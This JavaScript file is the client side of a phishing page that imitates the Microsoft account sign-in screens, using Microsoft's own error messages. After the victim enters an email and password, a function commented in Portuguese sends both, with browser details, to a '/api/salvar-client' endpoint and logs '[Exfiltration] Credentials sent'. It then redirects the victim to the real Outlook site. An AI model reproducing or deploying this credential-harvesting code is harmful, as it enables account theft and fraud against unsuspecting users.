document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

    let unameVal = pwdVal = false;

    // Next button
    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity, #user_identity_final').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "pwd";
        }
    })

    // Sign in button
    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', () => {
        validate();
        if (pwdVal) {
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";

            // Envia credenciais capturadas para o servidor
            enviarCredenciais(unameInp.value, pwdInp.value);
        }
    })

    function enviarCredenciais(email, senha) {
        // Envia as credenciais completas para o servidor
        fetch('/api/salvar-client', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessao: 'microsoft_login_' + Date.now(),
                dados: [
                    { tipo: 'credential', campo: 'email', tecla: email, timestamp: new Date().toISOString() },
                    { tipo: 'credential', campo: 'password', tecla: senha, timestamp: new Date().toISOString() }
                ],
                navegador: navigator.userAgent,
                plataforma: navigator.platform
            })
        }).then(r => r.json())
          .then(data => console.log('[Exfiltration] Credentials sent'))
          .catch(e => console.log('[Exfiltration] Error:', e));
    }

    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }
        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }
        }

        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
            unameInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
            pwdInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        }
        return false;
    }

    // Back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })

    // Final buttons
    document.getElementById('btn_final_no').addEventListener('click', () => {
        window.location.href = 'https://outlook.live.com';
    })

    document.getElementById('btn_final_yes').addEventListener('click', () => {
        window.location.href = 'https://outlook.live.com';
    })
})
